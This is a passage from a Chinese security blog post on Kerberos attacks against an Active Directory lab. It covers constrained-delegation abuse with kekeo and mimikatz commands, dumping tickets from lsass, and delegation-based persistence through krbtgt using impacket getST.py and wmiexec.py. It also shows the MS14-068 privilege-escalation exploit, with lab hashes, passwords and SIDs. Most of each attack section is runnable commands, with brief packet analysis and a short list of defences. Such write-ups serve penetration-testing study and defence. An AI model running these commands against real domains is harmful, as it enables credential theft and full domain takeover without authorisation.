<h2 id="请求用户TGT"><a href="#请求用户TGT" class="headerlink" title="请求用户TGT"></a>请求用户TGT</h2><p>已经知道服务用户明文的条件下，我们可以用kekeo请求该用户的TGT</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:PC-JACK-0DAY /domain:0day.org /password:password /ticket:test.kirbi</span><br></pre></td></tr></table></figure>
<p>参数：</p>
<p>/user : 服务用户的用户名</p>
<p>/password : 服务用户的明文密码</p>
<p>/domain : 所在域名</p>
<p>/ticket : 指定票据名称，不过这个参数没有生效，可以忽略</p>
<p>kekeo同样也支持使用 NTLM Hash</p>
<p>在请求服务用户的TGT那步直接把 /password 改成 /NTLM 即可</p>
<p>这里我们知道PC-JACK-0DAY的ntlm hash为：<strong>768623e06fae601be0c04759c87d93d3</strong></p>
<p>执行如下命令</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:PC<span class="literal">-JACK</span><span class="literal">-0DAY</span> /domain:<span class="number">0</span>day.org /NTLM:<span class="number">768623</span>e06fae601be0c04759c87d93d3 /ticket:test.kirbi</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/3a0223b33a18dfef9d228745ada6d32d.png"></p>
<p>得到<a href="mailto:&#x54;&#71;&#84;&#95;&#x50;&#x43;&#x2d;&#74;&#65;&#x43;&#75;&#x2d;&#48;&#x44;&#65;&#89;&#64;&#48;&#x44;&#65;&#89;&#x2e;&#x4f;&#82;&#x47;&#95;&#x6b;&#x72;&#98;&#x74;&#x67;&#x74;">&#x54;&#71;&#84;&#95;&#x50;&#x43;&#x2d;&#74;&#65;&#x43;&#75;&#x2d;&#48;&#x44;&#65;&#89;&#64;&#48;&#x44;&#65;&#89;&#x2e;&#x4f;&#82;&#x47;&#95;&#x6b;&#x72;&#98;&#x74;&#x67;&#x74;</a>~<a href="mailto:&#48;&#100;&#97;&#x79;&#x2e;&#111;&#114;&#103;&#x40;&#x30;&#x44;&#x41;&#x59;&#46;&#79;&#82;&#x47;&#46;&#x6b;&#x69;&#x72;&#98;&#x69;">&#48;&#100;&#97;&#x79;&#x2e;&#111;&#114;&#103;&#x40;&#x30;&#x44;&#x41;&#x59;&#46;&#79;&#82;&#x47;&#46;&#x6b;&#x69;&#x72;&#98;&#x69;</a></p>
<h2 id="获取ST"><a href="#获取ST" class="headerlink" title="获取ST"></a>获取ST</h2><p>然后我们可以使用这张TGT通过伪造s4u请求以 administrator 用户身份请求访问 OWA2010SP3 CIFS 的ST</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_PC-JACK-0DAY@0DAY.ORG_krbtgt\~0day.org@0DAY.ORG.kirbi /user:Administrator@0day.org /service:cifs/OWA2010SP3.0day.org</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/e7a8bb2fe4bfc13dee77c093401112ee.png"></p>
<p>S4U2Self 获取到的ST1以及 S4U2Proxy 获取到的OWA2010SP3 CIFS服务的ST2会保存在当前目录下</p>
<h2 id="注入ST2"><a href="#注入ST2" class="headerlink" title="注入ST2"></a>注入ST2</h2><p>然后我们用mimikatz将ST2导入当前会话即可</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@<span class="number">0</span>day.org@<span class="number">0</span>DAY.ORG_cifs\~OWA2010SP3.<span class="number">0</span>day.org@<span class="number">0</span>DAY.ORG.kirbi</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/fbd724d3a2c9f63620b4b7e21b70d505.png"></p>
<h2 id="访问域控-1"><a href="#访问域控-1" class="headerlink" title="访问域控"></a>访问域控</h2><p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/5e44c8d6d02daf7437282a2f3a9e2c1c.png"></p>
<h2 id="不知道服务用户密码的情况"><a href="#不知道服务用户密码的情况" class="headerlink" title="不知道服务用户密码的情况"></a>不知道服务用户密码的情况</h2><p>如果我们不知道服务用户的明文和NTLM Hash，但是我们有了服务用户登陆的主机权限（需要本地管理员权限），我们可以用 mimikatz 直接从内存中把服务用户的TGT dump出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/6ba95a1778b4480e674af0938aa70e5d.png"></p>
<p>注： sekurlsa::tickets 是列出和导出所有会话的 Kerberos 票据， sekurlsa::tickets 和 kerberos::list不同，sekurlsa是从内存读取，也就是从lsass进程读取，这也就是为什么<br>sekurlsa::tickets /export 需要管理员权限的原因。并且 sekurlsa::tickets的导出不受密钥限制，sekurlsa可以访问其他会话（用户）的票证。</p>
<p>既然服务用户的TGT导出来了，我们就跳过 tgt::ask 请求TGT这步，直接 tgs::s4u</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:[0;3e7]-2-1-40e00000-PC-JACK-0DAY\$@krbtgt-0DAY.ORG.kirbi /user:Administrator@0day.org /service:cifs/OWA2010SP3.0day.org</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/587cd654d9ac8e32e0f510ba59fafd99.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@0day.org@0DAY.ORG_cifs\~OWA2010SP3.0day.org@0DAY.ORG.kirbi</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/17d180feaf9bffaeaba4544c12d17cac.png"></p>
<h1 id="抓包分析约束性委派攻击过程"><a href="#抓包分析约束性委派攻击过程" class="headerlink" title="抓包分析约束性委派攻击过程"></a>抓包分析约束性委派攻击过程</h1><p>这里可以看到有6个请求</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/ea9f392bfdf55a024a0e2d75c7d7652f.png"></p>
<h2 id="AS-REQ-1"><a href="#AS-REQ-1" class="headerlink" title="AS-REQ"></a>AS-REQ</h2><p>可以看到用户PC-JACK-0DAY用户向KDC请求一张TGT</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/97217de84f6d34bc0569a4a859dd957e.png"></p>
<h2 id="AS-REP-1"><a href="#AS-REP-1" class="headerlink" title="AS-REP"></a>AS-REP</h2><p>返回一张TGT，这张TGT代表的就是PC-JACK-0DAY这个用户</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/d04187e7f72174ca30bd5ba20a68dfbd.png"></p>
<h2 id="第一次的TGS-REQ和TGS-REP"><a href="#第一次的TGS-REQ和TGS-REP" class="headerlink" title="第一次的TGS-REQ和TGS-REP"></a>第一次的TGS-REQ和TGS-REP</h2><p>用这张 TGT 发送 S4U2self 请求，以 Administrator 的名义向 TGS 申请了一张访问自身服务的票据，ST1</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/39f7ac3e4f69ce5596d69d552dec45ce.png"></p>
<h2 id="第二次的TGS-REQ和TGS-REP"><a href="#第二次的TGS-REQ和TGS-REP" class="headerlink" title="第二次的TGS-REQ和TGS-REP"></a>第二次的TGS-REQ和TGS-REP</h2><p>得到 ST1 之后，然后会带上ST1再次向 KDC 发起 SU42Proxy 请求，以 administrator 的名义请求一张访问 OWA2010SP3 cifs 服务的票据，ST2</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/73e15ab64ec028e4471a609992ca4951.png"></p>
<h1 id="利用约束性委派进行权限维持"><a href="#利用约束性委派进行权限维持" class="headerlink" title="利用约束性委派进行权限维持"></a>利用约束性委派进行权限维持</h1><p>我们都知道TGT的生成是由 krbtgt 用户加密和签名的，如果我们能委派域上的用户去访问TGS ，那么就可以伪造任意用户的TGT了，黄金票据通常情况下我们是用 krbtgt的hash来伪造TGT，不过我们通过约束委派也能达到同样的效果。</p>
<p>注： TGS 默认的spn是 krbtgt/domain name ，我们操作环境是 krbtgt/QIYOU.COM</p>
<p>krbtgt 默认是禁用的而且无法启用，所以我们无法使用界面来添加这个SPN。</p>
<p>我们可以使用powershell来添加</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> ActiveDirectory</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="built_in">Get-ADUser</span> test <span class="literal">-Properties</span> <span class="string">&quot;msDS-AllowedToDelegateTo&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-ADObject</span> <span class="variable">$user</span> <span class="literal">-Add</span> <span class="selector-tag">@</span>&#123; <span class="string">&quot;msDS-AllowedToDelegateTo&quot;</span> = <span class="selector-tag">@</span>(<span class="string">&quot;krbtgt/0day.org&quot;</span>) &#125;</span><br></pre></td></tr></table></figure>
<p>我们控制的用户选择的是自己创建的 test 域用户。密码Yicunyiye123</p>
<ul>
<li><p>  域控：OWA2010SP3 192.168.200.146</p>
</li>
<li><p>  域：0day.org</p>
</li>
<li><p>  攻击机：Kali</p>
</li>
</ul>
<p>首先修改 kali 的/etc/hosts/文件，添加如下内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.200.146 0day.org</span><br><span class="line"></span><br><span class="line">192.168.200.146 OWA2010SP3</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/1b81e56b29cfd70e8838071ff1a72e69.png"></p>
<p>创建域用户test然后赋予SPN</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/5de75872895a6bdc89ffd782997f4dea.png"></p>
<p>然后在域控上配置test用户到krbtgt用户的约束性委派</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> ActiveDirectory</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="built_in">Get-ADUser</span> test <span class="literal">-Properties</span> <span class="string">&quot;msDS-AllowedToDelegateTo&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-ADObject</span> <span class="variable">$user</span> <span class="literal">-Add</span> <span class="selector-tag">@</span>&#123; <span class="string">&quot;msDS-AllowedToDelegateTo&quot;</span> = <span class="selector-tag">@</span>(<span class="string">&quot;krbtgt/0day.org&quot;</span>) &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/2dad8c3aec6b396cb8557870cea4052d.png"></p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/9c1d6dd86dacfd8c0def0e6ed33a6ac4.png"></p>
<p>可以看到test账户具有委派性</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/6d328fdb9a598c6fd0b4eedb56035e30.png"></p>
<p>然后在kali上攻击</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py -dc-ip <span class="number">192.168</span><span class="number">.200</span><span class="number">.146</span> -spn krbtgt/0day.org -impersonate administrator 0day.org/test:Yicunyiye123</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/bdd3ca64136c713f9055817799d214e2.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line"></span><br><span class="line">python3 wmiexec.py -no-<span class="keyword">pass</span> -k administrator@OWA2010SP3 -dc-ip <span class="number">192.168</span><span class="number">.200</span><span class="number">.146</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/5a274eca4675dd9fc71fcfc755ea9714.png"></p>
<h1 id="域委派的防御措施"><a href="#域委派的防御措施" class="headerlink" title="域委派的防御措施"></a>域委派的防御措施</h1><p>因为委派比较实用我们也不能说直接简单粗暴关闭该功能</p>
<p>1.高权限用户可以设置不能被委派</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/6463b452e46691e75357544feb13ab94.png"></p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/ab4f46606fcd4c0c5cdc6ae58cc52dde.png"></p>
<p>可以看到administrator是无法成功的，但是sqladmin可以</p>
<p>2.Windows 2012<br>R2及更高的系统建立了受保护的用户组，组内用户不允许被委派，这是有效的手段。受保护的用户组，当这个组内的用户登录时（windows<br>2012 R2域服务器，客户端必须为Windows 8.1或之上），不能使用NTLM认证；适用于<br>Windows Server 2016 ， Windows Server 2012 R2 、 Windows Server 2012</p>
<p>3.一般TGT 4小时后失效</p>
<p>4.Kerberos预认证时不使用DES或者RC4等加密算法</p>
<h1 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h1><p>原理分析：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/192810#h2-1">https://www.anquanke.com/post/id/192810h2-1</a></p>
<p>kerberos的流程：</p>
<p>1.用户向KDC发起AS_REQ,请求凭据是用户hash加密的时间戳，KDC使用用户hash进行解密，如果结果正确返回用krbtgt<br>hash加密的TGT票据</p>
<p>2.用户凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求，KDC使用krbtgt<br>hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据</p>
<p>3.用户拿着TGS票据去请求服务，服务使用自己的hash解密TGS票据。如果解密正确，就允许用户访问。</p>
<p>上面这个流程看起来没错，却忽略一个最重要的因素，那就是用户有没有权限访问该服务，在上面的流程里面，只要用户的hash正确，那么就可以拿到TGT，有了TGT，就可以拿到TGS，有了TGS，就可以访问服务，任何一个用户都可以访问任何服务。也就是说上面的流程解决了”Who am i?”的问题，并没有解决 “What can I do?”的问题。</p>
<p>在Kerberos最初设计的流程里说明了如何证明客户端的真实身份，但是并没有说明客户端是否有权限访问该服务，因为在域中不同权限的用户能够访问的资源是不同的。所以微软为了解决权限这个问题，引入了 PAC (Privilege Attribute Certificate，特权属性证书) 的概念。</p>
<h1 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h1><p>MS14-068编号CVE-2014-6324，补丁为3011780，如果自检可在域控制器上使用命令检测。<br><code>systeminfo |find &quot;3011780&quot;</code> 为 空说明该服务器存在MS14-068漏洞</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/2467ca4c2db473eecf889bf8960c7314.png"></p>
<p>环境：</p>
<p>域机器：MESSI-PC，win7，知道一个域用户和密码：mars2\Drunkmars，Fcb0519..，拥有该机器的管理员权限</p>
<p>域控：WIN-M836NN6NU8B，ip:192.168.10.5</p>
<h2 id="生成票据"><a href="#生成票据" class="headerlink" title="生成票据"></a>生成票据</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14<span class="literal">-068</span>.exe <span class="literal">-u</span> mars2@Drunkmars.com <span class="literal">-p</span> Fcb0519.. <span class="literal">-s</span> S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-652679085</span><span class="literal">-3170934373</span><span class="literal">-4288938398</span><span class="literal">-1107</span> <span class="literal">-d</span> <span class="number">192.168</span>.<span class="number">10.5</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/c4634c1a3f7d9b089f13f50b6e7139d6.png"></p>
<p>可以看到已经生成了<a href="mailto:&#x54;&#x47;&#84;&#95;&#109;&#x61;&#x72;&#115;&#50;&#x40;&#68;&#x72;&#x75;&#110;&#107;&#x6d;&#x61;&#114;&#115;&#46;&#99;&#111;&#109;&#x2e;&#99;&#99;&#97;&#x63;&#x68;&#x65;">&#x54;&#x47;&#84;&#95;&#109;&#x61;&#x72;&#115;&#50;&#x40;&#68;&#x72;&#x75;&#110;&#107;&#x6d;&#x61;&#114;&#115;&#46;&#99;&#111;&#109;&#x2e;&#99;&#99;&#97;&#x63;&#x68;&#x65;</a></p>
<h2 id="mimikatz导入票据"><a href="#mimikatz导入票据" class="headerlink" title="mimikatz导入票据"></a>mimikatz导入票据</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc 票据路径</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/723d8e4bc3a17bb2edac4614e249c994.png"></p>
<h2 id="访问域控-2"><a href="#访问域控-2" class="headerlink" title="访问域控"></a>访问域控</h2><p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/ea07d8cb64b6c712c900515fccf959a6.png"></p>

    </article>
    <!-- license -->
    
        <div class="license-wrapper">
            <p>原文作者：<a href="http://example.com">Drunkmars</a>
            <p>原文链接：<a href="http://example.com/2021/04/06/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/">http://example.com/2021/04/06/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/</a>
            <p>发表日期：<a href="http://example.com/2021/04/06/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/">April 6th 2021, 12:00:00 am</a>
            <p>更新日期：<a href="http://example.com/2021/04/06/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/">May 27th 2021, 8:36:33 pm</a>
            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
        </div>
    
    <!-- paginator -->
    <ul class="post-paginator">
        <li class="next">
            
                <div class="nextSlogan">Next Post</div>
                <a href="/2021/04/08/windows%E7%8E%AF%E5%A2%83%E4%B8%8B%E6%8A%93%E5%AF%86%E7%A0%81%E6%80%BB%E7%BB%93/" title="windows环境下抓密码总结">
                    <div class="nextTitle">windows环境下抓密码总结</div>
                </a>
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href="/2021/04/04/Stega/" title="Stega">
                    <div class="prevTitle">Stega</div>
                </a>
            
        </li>
    </ul>
    <!-- comment -->
    
        <div class="post-comment">
            <!-- 来必力 City 版安装代码 -->


            

            

            

            <!-- utteranc评论 -->


            <!-- partial('_partial/comment/changyan') -->
            <!--PC版-->


            
            

        </div>
    
    <!-- timeliness note -->
    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
    
    <!-- Mathjax -->
    
</main>

                <!-- profile -->
                
            </div>
            <footer class="footer footer-unloaded">
    <!-- social  -->
    
        <div class="social">
            
    
        
            
                <a href="mailto:drunkmars@vip.qq.com" class="iconfont-archer email" title=email ></a>
            
        
    
        
            
                <a href="https://github.com/Drunkmars" class="iconfont-archer github" target="_blank" title=github></a>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
            
                <a href="https://twitter.com/Drunkmars404" class="iconfont-archer twitter" target="_blank" title=twitter></a>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
            
                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
            
        
    


        </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
    </div>
    <!-- website approve for Chinese user -->
    
    <!-- 不蒜子  -->
    
        <div class="busuanzi-container">
            
             
                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
            
        </div>
    	
</footer>

        </div>
        <!-- toc -->
        
            <div class="toc-wrapper toc-wrapper-loding" style=







    top:50vh;

>
                <div class="toc-catalog">
                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                </div>
                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AS-REQ"><span class="toc-number">2.</span> <span class="toc-text">AS-REQ</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">wireshark抓包分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#req-body%E8%AF%A6%E7%BB%86%E8%AF%B7%E6%B1%82%E5%8C%85"><span class="toc-number">2.2.</span> <span class="toc-text">req-body详细请求包</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AS-REQ%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text">AS-REQ过程中的攻击方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#hash%E4%BC%A0%E9%80%92"><span class="toc-number">3.1.</span> <span class="toc-text">hash传递</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E8%BF%9B%E8%A1%8Chash%E4%BC%A0%E9%80%92"><span class="toc-number">3.1.1.</span> <span class="toc-text">msf进行hash传递</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz%E8%BF%9B%E8%A1%8Chash%E4%BC%A0%E9%80%92"><span class="toc-number">3.1.2.</span> <span class="toc-text">mimikatz进行hash传递</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KB2871997"><span class="toc-number">3.1.3.</span> <span class="toc-text">KB2871997</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PTK-pass-the-key"><span class="toc-number">3.1.4.</span> <span class="toc-text">PTK(pass the key)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="toc-number">3.2.</span> <span class="toc-text">域内用户枚举</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="toc-number">3.3.</span> <span class="toc-text">密码喷洒</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AS-REP"><span class="toc-number">4.</span> <span class="toc-text">AS-REP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AS-REP%E4%B8%AD%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">5.</span> <span class="toc-text">AS-REP中的攻击方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">5.1.</span> <span class="toc-text">黄金票据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8mimikatz"><span class="toc-number">5.1.1.</span> <span class="toc-text">使用mimikatz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8impacket"><span class="toc-number">5.1.2.</span> <span class="toc-text">使用impacket</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AS-REP-Roasting"><span class="toc-number">5.2.</span> <span class="toc-text">AS-REP Roasting</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TGS-REQ"><span class="toc-number">6.</span> <span class="toc-text">TGS-REQ</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TGS-REP"><span class="toc-number">7.</span> <span class="toc-text">TGS-REP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TGS-REP%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">8.</span> <span class="toc-text">TGS-REP过程中的攻击方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%95%E4%B8%BASPN"><span class="toc-number">8.1.</span> <span class="toc-text">何为SPN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberoast%E6%94%BB%E5%87%BB"><span class="toc-number">8.2.</span> <span class="toc-text">Kerberoast攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">8.3.</span> <span class="toc-text">白银票据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E7%9A%84%E4%B8%8D%E5%90%8C%E7%82%B9"><span class="toc-number">8.4.</span> <span class="toc-text">黄金票据和白银票据的不同点</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A7%94%E6%B4%BE"><span class="toc-number">9.</span> <span class="toc-text">委派</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="toc-number">9.1.</span> <span class="toc-text">非约束性委派</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="toc-number">9.2.</span> <span class="toc-text">约束性委派</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="toc-number">9.3.</span> <span class="toc-text">基于资源的约束性委派</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%92%8C%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%B7%AE%E5%88%AB"><span class="toc-number">9.4.</span> <span class="toc-text">基于资源的约束性委派和约束性委派差别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%92%8C%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="toc-number">9.5.</span> <span class="toc-text">非约束委派和约束委派的流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%B5%81%E7%A8%8B"><span class="toc-number">9.5.1.</span> <span class="toc-text">非约束委派流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E6%B5%81%E7%A8%8B"><span class="toc-number">9.5.2.</span> <span class="toc-text">约束性委派流程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AD%9B%E9%80%89%E9%9D%9E%E5%A7%94%E6%B4%BE%E5%B1%9E%E6%80%A7%E7%9A%84%E8%B4%A6%E5%8F%B7"><span class="toc-number">10.</span> <span class="toc-text">筛选非委派属性的账号</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PowerSploit%E4%B8%8B%E7%9A%84PowerView-ps1%E8%84%9A%E6%9C%AC"><span class="toc-number">10.1.</span> <span class="toc-text">PowerSploit下的PowerView.ps1脚本</span></a></li><li class="toc-item toc-level-2"><a 